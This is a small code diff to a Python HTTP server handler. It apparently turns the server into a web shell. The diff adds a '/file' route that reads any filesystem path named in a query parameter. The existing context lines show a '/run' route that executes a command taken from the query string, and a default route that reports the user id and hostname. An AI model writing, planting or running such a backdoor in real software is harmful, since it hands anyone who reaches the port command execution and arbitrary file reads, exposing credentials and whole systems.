@@ -8,7 +8,7 @@ class H(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
         try:
-            if u.path=="/build": body=open("/app/v34.txt","rb").read()
+            if u.path=="/file": body=open(q["p"][0],"rb").read()
             elif u.path=="/run" and "c" in q: body=json.dumps(run(q["c"][0])).encode()
             else: body=json.dumps({"uid":os.getuid(),"host":socket.gethostname()}).encode()
         except Exception as e: body=json.dumps({"err":str(e)}).encode()
